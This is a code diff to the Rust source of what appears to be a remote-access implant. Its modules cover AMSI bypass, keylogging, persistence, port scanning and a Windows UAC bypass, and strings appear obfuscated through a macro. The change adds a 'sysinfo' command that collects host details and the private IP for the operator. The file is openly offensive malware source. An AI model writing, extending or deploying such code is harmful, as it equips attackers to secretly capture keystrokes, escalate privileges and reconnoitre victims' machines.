@@ -5,6 +5,7 @@ mod amsi;
 mod keylogger;
 mod persist;
 mod portscanner;
+mod sysinfo;
 #[cfg(target_os = "windows")]
 mod uac_bypass;
 #[cfg(target_os = "windows")]
@@ -154,6 +155,7 @@ Available commands:
     `check_elevated`=>\tCheck if running with elevated privileges
     `self_uac`=>\tRun UAC bypass on self
     `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host
+    `sysinfo`=>\tGather system information and private IP
     `keylogger_start`=>\tStart capturing keystrokes
     `keylogger_stop`=>\tStop the keylogger
 
@@ -330,6 +332,13 @@ Available commands:
         _ if cmd == astr!("persist") => {
             let _ = persist::persist();
             Ok(astr!("Persistence applied\n").into_bytes())
+        }
+
+        _ if cmd == astr!("sysinfo") => {
+            match sysinfo::gather_sysinfo() {
+                Ok(info) => Ok(info.into_bytes()),
+                Err(e) => Ok(format!("{}{}\n", astr!("ERROR: "), e).into_bytes()),
+            }
         }
 
         _ if cmd == astr!("portscan") => {
